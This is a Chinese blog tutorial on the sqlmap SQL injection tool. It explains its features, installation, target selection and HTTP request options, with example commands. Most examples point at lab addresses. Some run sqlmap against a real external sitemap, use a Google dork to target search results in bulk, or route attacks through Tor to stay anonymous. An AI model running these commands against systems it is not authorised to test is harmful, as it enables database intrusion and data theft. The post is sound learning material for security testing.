<!DOCTYPE html>





<html class="theme-next muse use-motion" lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="generator" content="Hexo 3.9.0">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.3.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.3.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.3.0">
  <link rel="mask-icon" href="/images/logo.svg?v=7.3.0" color="#222">

<link rel="stylesheet" href="/css/main.css?v=7.3.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.3.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    save_scroll: false,
    copycode: {"enable":false,"show_result":false,"style":null},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: '',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Copy',
      copy_success: 'Copied',
      copy_failure: 'Copy failed'
    }
  };
</script>

  <meta name="description" content="一、Sqlmap是什么Sqlmap是开源的自动化SQL注入工具，由Python写成，具有如下特点：  完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统。 完全支持布尔型盲注、时间型盲注">
<meta property="og:type" content="article">
<meta property="og:title" content="Sqlmap">
<meta property="og:url" content="http://fangshengjian.github.io/2019/08/18/sqlmap/index.html">
<meta property="og:site_name" content="fangshengjian&#39;s blog">
<meta property="og:description" content="一、Sqlmap是什么Sqlmap是开源的自动化SQL注入工具，由Python写成，具有如下特点：  完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统。 完全支持布尔型盲注、时间型盲注">
<meta property="og:locale" content="zh">
<meta property="og:updated_time" content="2019-08-19T07:05:40.752Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Sqlmap">
<meta name="twitter:description" content="一、Sqlmap是什么Sqlmap是开源的自动化SQL注入工具，由Python写成，具有如下特点：  完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统。 完全支持布尔型盲注、时间型盲注">
  <link rel="canonical" href="http://fangshengjian.github.io/2019/08/18/sqlmap/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: false,
    isPost: true,
    isPage: false,
    isArchive: false
  };
</script>

  <title>Sqlmap | fangshengjian's blog</title>
  








  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh">

  <div class="container sidebar-position-left">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">fangshengjian's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
      
      
      
        
        <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
      
      
      
        
        <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>
  </ul>

    

</nav>
</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content page-post-detail">
            

  <div id="posts" class="posts-expand">
    

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://fangshengjian.github.io/2019/08/18/sqlmap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="fangshengjian">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fangshengjian's blog">
    </span>
      <header class="post-header">

        
          <h1 class="post-title" itemprop="name headline">Sqlmap

            
          </h1>
        

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-08-18 14:30:34" itemprop="dateCreated datePublished" datetime="2019-08-18T14:30:34+08:00">2019-08-18</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-08-19 15:05:40" itemprop="dateModified" datetime="2019-08-19T15:05:40+08:00">2019-08-19</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="一、Sqlmap是什么"><a href="#一、Sqlmap是什么" class="headerlink" title="一、Sqlmap是什么"></a>一、Sqlmap是什么</h2><p>Sqlmap是开源的自动化SQL注入工具，由Python写成，具有如下特点：</p>
<ul>
<li>完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统。</li>
<li>完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。</li>
<li>在数据库证书、IP地址、端口和数据库名等条件允许的情况下支持不通过SQL注入点而直接连接数据库。</li>
<li>支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。</li>
<li>支持自动识别密码哈希格式并通过字典破解密码哈希。</li>
<li>支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。</li>
<li>支持在数据库管理系统中搜索指定的数据库名、表名或列名</li>
<li>当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持下载或上传文件。</li>
<li>当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持执行任意命令并回现标准输出。</li>
</ul>
<h2 id="二、安装Sqlmap"><a href="#二、安装Sqlmap" class="headerlink" title="二、安装Sqlmap"></a>二、安装Sqlmap</h2><p>Sqlmap的开源项目，托管在github，最简单的安装方式便是使用git，执行如下命令：</p>
<p><code>git clone https://github.com/sqlmapproject/sqlmap.git</code></p>
<p>片刻后命令执行完毕，可以看到当前目录中多了一个名为“sqlmap”的目录，该目录中保存着Sqlmap的Python源码、配置文件和文档。由于Python是解释执行的语言，不用编译，所以至此最新版的Sqlmap已经安装完成。<br>cd到“sqlmap”目录中，用命令“python sqlmap”启动Sqlmap。<br>当想要更新Sqlmap时，进入到“sqlmap”目录中执行命令“git pull”即可。</p>
<h2 id="三、输出级别-Output-verbosity"><a href="#三、输出级别-Output-verbosity" class="headerlink" title="三、输出级别(Output verbosity)"></a>三、输出级别(Output verbosity)</h2><p>参数：-v</p>
<p>Sqlmap的输出信息按从简到繁共分为7个级别（和葫芦娃一样多），依次为0、1、2、3、4、5和6。使用参数“-v &lt;级别&gt;”来指定某个等级，如使用参数“-v 6”来指定输出级别为6。默认输出级别为1。各个输出级别的描述如下：</p>
<ul>
<li>0：只显示Python的tracebacks信息、错误信息[ERROR]和关键信息[CRITICAL]；</li>
<li>1：同时显示普通信息[INFO]和警告信息[WARNING]；</li>
<li>2：同时显示调试信息[DEBUG]；</li>
<li>3：同时显示注入使用的攻击荷载；</li>
<li>4：同时显示HTTP请求；</li>
<li>5：同时显示HTTP响应头；</li>
<li>6：同时显示HTTP响应体。  </li>
</ul>
<p>各个级别输出的信息详细到什么程度，还需要自己尝试下，亲眼见到，才会有明确的认识。</p>
<h2 id="四、指定目标"><a href="#四、指定目标" class="headerlink" title="四、指定目标"></a>四、指定目标</h2><p>Sqlmap运行时必须指定至少一个目标，支持一次指定多个目标。有以下几种指定目标的方式：</p>
<h3 id="1-直接连接数据库"><a href="#1-直接连接数据库" class="headerlink" title="1.直接连接数据库"></a>1.直接连接数据库</h3><p>参数：-d</p>
<p>使用参数“-d”直接连接数据库，该参数后跟一个表示数据库的字符串，该字符串有以下两种格式：</p>
<h4 id="1-当数据库管理系统是MySQL、Oracle、Microsoft-SQL-Server或PostgreSQL等时格式为："><a href="#1-当数据库管理系统是MySQL、Oracle、Microsoft-SQL-Server或PostgreSQL等时格式为：" class="headerlink" title="(1).当数据库管理系统是MySQL、Oracle、Microsoft SQL Server或PostgreSQL等时格式为："></a>(1).当数据库管理系统是MySQL、Oracle、Microsoft SQL Server或PostgreSQL等时格式为：</h4><p><code>DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME</code></p>
<h4 id="2-当数据库管理系统是SQLite、Microsoft-Access或Firebird等时格式为："><a href="#2-当数据库管理系统是SQLite、Microsoft-Access或Firebird等时格式为：" class="headerlink" title="(2).当数据库管理系统是SQLite、Microsoft Access或Firebird等时格式为："></a>(2).当数据库管理系统是SQLite、Microsoft Access或Firebird等时格式为：</h4><p><code>DBMS://DATABASE_FILEPATH</code></p>
<p>我用如下命令连接装在本机上的Mysql：</p>
<p><code>python sqlmap.py -d &quot;mysql://root:root@127.0.0.1:3306/DISSchool&quot;</code></p>
<p>却出现了错误，错误为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[CRITICAL] sqlmap requires &apos;python-pymysql&apos; third-party library in order to directly connect to the DBMS &apos;MySQL&apos;. You can download it from &apos;https://github.com/petehunt/PyMySQL/&apos;. Alternative is to use a package &apos;python-sqlalchemy&apos; with support for dialect &apos;mysql&apos; installed</span><br></pre></td></tr></table></figure>

<p>意思是我没有安装Python连接Mysql用的第三方库python-pymysql。虽然我安装了python-mysqldb可以使Python连接Mysql，但显然Sqlmap使用的是python-pymysql而不是python-mysqldb。使用如下命令安装python-pymysql：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/petehunt/PyMySQL/</span><br><span class="line">cd PyMySQL/</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>

<p>安装好python-pymysql后再执行命令：</p>
<p><code>python sqlmap.py -d &quot;mysql://root:root@127.0.0.1:3306/DISSchool&quot;</code></p>
<p>这次没有报错，成功的连接到了数据库。只是除了检测数据库确实是Mysql版本号大于等于5.0.0之外便什么都没有做。让Sqlmap做点什么需要用其他参数指定，这些参数我们稍晚些再学习。</p>
<h3 id="2-指定目标URL"><a href="#2-指定目标URL" class="headerlink" title="2.指定目标URL"></a>2.指定目标URL</h3><p>参数：-u 或 –url</p>
<p>使用参数“-u”或“–url”指定一个URL作为目标，该参数后跟一个表示URL的字符串，可以是http协议也可以是https协议，还可以指定端口，如：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.56.102:8080/user.php?id=0&quot;</code></p>
<h3 id="3-从Burp或WebScarab的代理日志中解析目标"><a href="#3-从Burp或WebScarab的代理日志中解析目标" class="headerlink" title="3.从Burp或WebScarab的代理日志中解析目标"></a>3.从Burp或WebScarab的代理日志中解析目标</h3><p>参数：-l</p>
<p>使用参数“-l”指定一个Burp或WebScarab的代理日志文件，Sqlmap将从日志文件中解析出可能的攻击目标，并逐个尝试进行注入。该参数后跟一个表示日志文件的路径。</p>
<p>WebScarab我没有用过，Burp倒是常常会用。Burp默认不记录日志，想要记录日志需要手动开启，设置方法如下图所示：</p>
<p>只用勾选代理中的请求数据就足够了，日志文件路径可随意设置，这里我设置日志文件名为proxy.log，放在用户主目录中。</p>
<p>设置浏览器的代理为Burp，随便浏览几个网页后发现proxy.log竟然已经有70多K大，查看其内容，部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">werner@Yasser:~$ more proxy.log</span><br><span class="line">======================================================</span><br><span class="line">7:22:52 PM  http://ocsp.digicert.com:80  [117.18.237.29]</span><br><span class="line">======================================================</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ocsp.digicert.com</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-SG,en-US;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 83</span><br><span class="line">Content-Type: application/ocsp-request</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">0Q0O0M0K0I0   +</span><br><span class="line">�ǝ��Pr�Tz�</span><br><span class="line">======================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================================================</span><br><span class="line">7:23:00 PM  http://blog.csdn.net:80  [47.95.49.160]</span><br><span class="line">======================================================</span><br><span class="line">GET /pyufftj/article/details/21469201 HTTP/1.1</span><br><span class="line">Host: blog.csdn.net</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>可以看到该日志文件不仅记录了GET参数，还记录了cookie和POST参数。现在使用如下命令让Sqlmap解析该日志文件，自动寻找目标，检测注入漏洞：</p>
<p><code>python sqlmap.py -l ../proxy.log</code></p>
<p>注意日志文件的路径要写正确。执行该命令时，每找到一个可能的攻击目标，Sqlmap都会询问是否要检测该目标。，默认回答为“Y”，想要测试该目标，直接按回车键就行。</p>
<p>当日志较大时会有很多可能目标，虽然有询问机制但依旧麻烦，因为不能一路按回车而要进行判断。若是可以对日志进行过滤就好了！确实是可以的，参数为“–scope”，详情见“五.18”。</p>
<h3 id="4-从站点地图文件中解析目标"><a href="#4-从站点地图文件中解析目标" class="headerlink" title="4.从站点地图文件中解析目标"></a>4.从站点地图文件中解析目标</h3><p>参数：-x</p>
<p>为便于搜索引擎收录，许多网站专门为搜索引擎生成了xml格式的站点地图，如百度Sitemap支持xml格式。Sqlmap可以直接解析xml格式的站点地图，从中提取攻击目标，对一个网站全方位无死角地进行注入检测，此时使用的参数是“-x”，如：</p>
<p><code>python sqlmap.py -x http://www.6eat.com/sitemap.xml</code></p>
<p>但执行该命令的结果却是：</p>
<p><code>[WARNING] no usable links found (with GET parameters)</code></p>
<p>没有找到有GET参数的可用链接。就我有限的经验而言，站点地图中的URL很少包含GET参数，POST参数就更不用说了。所以Sqlmap的这一功能似乎有些鸡肋。</p>
<h3 id="5-从文本文件中解析目标"><a href="#5-从文本文件中解析目标" class="headerlink" title="5.从文本文件中解析目标"></a>5.从文本文件中解析目标</h3><p>参数：-m</p>
<p>参数“-u”一次只能指定一个URL，若有多个URL需要测试就显得很不方便，我们可用将多个URL以一行一个的格式保存在文本文件中，然后使用参数“-m”，后跟该文本文件路径，让Sqlmap依次读取文件中的URL作为攻击目标。</p>
<p>如我们有文件url.txt，内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.target1.com/vuln1.php?q=foobar</span><br><span class="line">www.target2.com/vuln2.asp?id=1</span><br><span class="line">www.target3.com/vuln3/id/1*</span><br></pre></td></tr></table></figure>

<p>然后可用使用如下命令让Sqlmap测试这些URL是否存在注入漏洞：</p>
<p><code>python sqlmap.py -m url.txt</code></p>
<p>同样，执行该命令时，Sqlmap会很贴心地一个个询问：“do you want to test this URL?”</p>
<h3 id="6-从文件载入HTTP请求"><a href="#6-从文件载入HTTP请求" class="headerlink" title="6.从文件载入HTTP请求"></a>6.从文件载入HTTP请求</h3><p>参数：-r</p>
<p>可以将一个HTTP请求保存在文件中，然后使用参数“-r”加载该文件，Sqlmap会解析该文件，从该文件分析目标并进行测试。</p>
<p>设有如下所示的HTTP请求保存在文件get.txt中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /user.php?id=1 HTTP/1.1</span><br><span class="line">Host: 192.168.56.101:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-SG,en-US;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>则使用如下命令让Sqlmap解析该文件，以该文件中HTTP请求目标为攻击目标进行测试：</p>
<p><code>python sqlmap.py -r get.txt</code></p>
<h3 id="7-将Google搜索结果作为攻击目标"><a href="#7-将Google搜索结果作为攻击目标" class="headerlink" title="7.将Google搜索结果作为攻击目标"></a>7.将Google搜索结果作为攻击目标</h3><p>参数：-g</p>
<p>Sqlmap能自动获取Google搜索的前一百个结果，对其中有GET参数的URL进行注入测试。当然，所处的网络环境要能访问Google才行。下面是Sqlmap手册中“-g”参数的例子：</p>
<p><code>python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></p>
<h3 id="8-从配置文件中载入攻击目标"><a href="#8-从配置文件中载入攻击目标" class="headerlink" title="8.从配置文件中载入攻击目标"></a>8.从配置文件中载入攻击目标</h3><p>参数：-c</p>
<p>使用参数“-c”指定一个配置文件（如：sqlmap.conf），Sqlmap会解析该配置文件，按照该配置文件的配置执行动作。配置文件中可以指定攻击目标，实际上除了攻击目标外，配置文件还可以指定各种参数的值。</p>
<p>Sqlmap的按照目录中有一个名为sqlmap.conf的文件，该文件是配置文件的模板，看看该文件内容，就能明白配置文件是什么意思了。</p>
<h2 id="五、请求"><a href="#五、请求" class="headerlink" title="五、请求"></a>五、请求</h2><p>HTTP是一个复杂的协议。HTTP请求有很多种方法（method），可以在不同位置（GET、POST、cookie和User-Agent等）携带不同参数。往往只有在特定位置携带了特定参数以特定方法发起的请求才是合法有效的请求。Sqlmap运行时除了需要指定目标，有时还需要指定HTTP请求的一些细节。下面这些参数都用于指定HTTP请求细节。</p>
<h3 id="1-HTTP方法"><a href="#1-HTTP方法" class="headerlink" title="1.HTTP方法"></a>1.HTTP方法</h3><p>参数：–method</p>
<p>一般来说，Sqlmap能自动判断出是使用GET方法还是POST方法，但在某些情况下需要的可能是PUT等很少见的方法，此时就需要用参数“–method”来指定方法。如：“–method=PUT”。</p>
<h3 id="2-POST数据"><a href="#2-POST数据" class="headerlink" title="2.POST数据"></a>2.POST数据</h3><p>参数：–data</p>
<p>该参数指定的数据会被作为POST数据提交，Sqlmap也会检测该参数指定数据是否存在注入漏洞。如：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.56.102:8080/user.php&quot; --data=&quot;id=0&amp;name=werner&quot;</code></p>
<h3 id="3-指定分隔符"><a href="#3-指定分隔符" class="headerlink" title="3.指定分隔符"></a>3.指定分隔符</h3><p>参数：–param-del</p>
<p>上一个例子中“–data”的数据“id=0&amp;name=werner”其实由两个部分组成：“id=0”和“name=werner”，默认地以“&amp;”作为分隔符。我们可以使用“–param-del”来指定分隔符，如：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.56.102:8080/user.php&quot; --data=&quot;id=0;name=werner&quot; --param-del=&quot;;&quot;</code></p>
<h3 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h3><p>参数：–cookie、–cookie-del、–drop-set-cookie和–load-cookies</p>
<p>有两种情况会用到这些参数：</p>
<p>要测试的页面只有在登录状态下才能访问，登录状态用cookie识别<br>想要检测是否存在cookie注入<br>当“–level”设置为2或更高时，Sqlmap会检测cookie是否存在注入漏洞，关于“–level”的更多信息见下文。</p>
<h4 id="1-“–cookie”和“–cookie-del”"><a href="#1-“–cookie”和“–cookie-del”" class="headerlink" title="(1).“–cookie”和“–cookie-del”"></a>(1).“–cookie”和“–cookie-del”</h4><p>在浏览器中登录目标网站后复制出维持登录状态的cookie，用参数“–cookie”来指定这些cookie，如：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.56.102:8080/user.php&quot; --cookie &quot;JSESSIONID=E5D6C8C81;NAME=werner;&quot;</code></p>
<p>与POST参数不同，cookie默认的分隔符为“;”，想要指定cookie中的分隔符，使用参数“–cookie-del”。</p>
<h4 id="2-“–drop-set-cookie”"><a href="#2-“–drop-set-cookie”" class="headerlink" title="(2).“–drop-set-cookie”"></a>(2).“–drop-set-cookie”</h4><p>若HTTP响应头中有“Set-Cookie”，Sqlmap会自动设置“Set-Cookie”设置的cookie，并对这些cookie进行检测。若不想让Sqlmap这么做，添加参数“–drop-set-cookie”即可，这样，Sqlmap会忽略“Set-Cookie”。</p>
<h4 id="3-“–load-cookies”"><a href="#3-“–load-cookies”" class="headerlink" title="(3).“–load-cookies”"></a>(3).“–load-cookies”</h4><p>该参数用于从文件中载入Netscape或wget格式的cookie。</p>
<p>wget可以保存和载入cookie，示例如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Log in to the server.  This can be done only once.</span><br><span class="line">wget --save-cookies cookies.txt \</span><br><span class="line">     --post-data &apos;user=foo&amp;password=bar&apos; \</span><br><span class="line">     http://server.com/auth.php</span><br><span class="line"></span><br><span class="line"># Now grab the page or pages we care about.</span><br><span class="line">wget --load-cookies cookies.txt \</span><br><span class="line">     -p http://server.com/interesting/article.php</span><br></pre></td></tr></table></figure>

<h3 id="5-User-Agent"><a href="#5-User-Agent" class="headerlink" title="5.User-Agent"></a>5.User-Agent</h3><p>参数：–user-agent和–random-agent</p>
<p>默认情况下Sqlmap发送的HTTP请求中的User-Agent值为：</p>
<p><code>sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)</code></p>
<p>使用参数“–user-agent”可以指定一个User-Agent值。但正常的User-Agent值长什么样我们可能并不记得，所以有了参数“–random-agent”，使用该参数，Sqlmap会从文件./txt/user-agents.txt中随机地取一个User-Agent。注意，在一次会话中只有使用同一个User-Agent，并不是每发一个HTTP请求包，都随机一个User-Agent。</p>
<p>用如下命令统计user-agents.txt行数：</p>
<p><code>cat sqlmap/txt/user-agents.txt | wc -l</code></p>
<p>结果为4211，当然其中还包含空行、注释等，但总的来说该文件中存储的User-Agent也有4千多个。</p>
<p>当“–level”设置为3或更高时，Sqlmap会检测User-Agent是否存在注入漏洞，关于“–level”的更多信息见下文。</p>
<h3 id="6-Host"><a href="#6-Host" class="headerlink" title="6.Host"></a>6.Host</h3><p>参数：–host</p>
<p>使用该参数可以手动指定HTTP头中的Host值。</p>
<p>当“–level”设置为5或更高时，Sqlmap会检测Host是否存在注入漏洞，关于“–level”的更多信息见下文。</p>
<h3 id="7-Referer"><a href="#7-Referer" class="headerlink" title="7.Referer"></a>7.Referer</h3><p>参数：–referer</p>
<p>使用该参数可以指定HTTP头中的Referer值。Sqlmap发送的HTTP请求头部默认无Referer字段。</p>
<p>当“–level”设置为3或更高时，Sqlmap会检测Referer是否存在注入漏洞，关于“–level”的更多信息见下文。–</p>
<h3 id="8-额外的HTTP头"><a href="#8-额外的HTTP头" class="headerlink" title="8.额外的HTTP头"></a>8.额外的HTTP头</h3><p>参数：-H、–headers</p>
<p>使用该参数可以在Sqlmap发送的HTTP请求报文头部添加字段，若添加多个字段，用“\n”分隔。如命令：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.56.101:8080/&quot; -v 5 --headers &quot;X-A:A\nX-B: B&quot;</code></p>
<p>发送的HTTP请求包为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">X-B: B</span><br><span class="line">Host: 192.168.56.101:8080</span><br><span class="line">Accept-encoding: gzip,deflate</span><br><span class="line">X-A: A</span><br><span class="line">Accept: */*</span><br><span class="line">User-agent: sqlmap/1.1.10#stable (http://sqlmap.org)</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>加参数“-v 5”是为了让Sqlamp输出发送的HTTP请求包，便于我们观察。</p>
<h3 id="9-身份认证"><a href="#9-身份认证" class="headerlink" title="9.身份认证"></a>9.身份认证</h3><p>参数：–auth-type和–auth-cred</p>
<p>这些参数用于进行身份认证。“–auth-type”用于指定认证方式，支持以下三种身份认证方式：</p>
<ul>
<li>Basic</li>
<li>Digest</li>
<li>NTLM</li>
</ul>
<p>“–auth-cred”用于给出身份认证的凭证，格式是“username:password”。如：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;</code></p>
<h3 id="10-基于证书的身份认证"><a href="#10-基于证书的身份认证" class="headerlink" title="10.基于证书的身份认证"></a>10.基于证书的身份认证</h3><p>参数：–auth-file</p>
<p>若Web服务器要求客户端提供证书则可以使用此参数指定一个PEM格式的证书文件。我们知道SSL协议的客户端认证是可选的，实践中一般都只用服务器端提供自己的证书供客户端验证，很少要求客户端提供自己的证书。</p>
<h3 id="11-忽略错误code"><a href="#11-忽略错误code" class="headerlink" title="11.忽略错误code"></a>11.忽略错误code</h3><p>参数：–ignore-code</p>
<p>如使用该参数忽略401错误（未认证）。</p>
<h3 id="12-HTTP-S-代理"><a href="#12-HTTP-S-代理" class="headerlink" title="12.HTTP(S)代理"></a>12.HTTP(S)代理</h3><p>参数：–proxy、–proxy-cred、–proxy-file和–ignore-proxy</p>
<p>使用参数“–proxy”来设置一个HTTP(S)代理，格式是“http(s)://url:port”。若代理需要认证，使用参数“–proxy-cred”来提供认证凭证，格式是“username:password”。</p>
<p>使用参数“–proxy-file”指定一个存储着代理列表的文件，Sqlmap会依次使用文件中的代理，当某个代理有任何连接问题时就会被弃用而换下一个代理。</p>
<p>使用参数“–ignore-proxy”忽略本地代理设置。</p>
<h3 id="13-Tor匿名网络"><a href="#13-Tor匿名网络" class="headerlink" title="13.Tor匿名网络"></a>13.Tor匿名网络</h3><p>参数：–tor、–tor-type、–tor-port和–check-tor</p>
<p>不管出于什么原因，如果想要保持匿名状态与其使用单个的HTTP(S)代理，不如安装类似Privoxy这样的软件按照Tor的安装指导配置一个Tor客户端。设置好后使用参数“–tor”让Sqlmap自动设置使用Tor代理。</p>
<p>如果想要手动指定Tor的类型和端口可以使用参数“–tor-type”和“–tor-port”，如：</p>
<p><code>--tor-type=SOCKS5 --tor-port 9050</code></p>
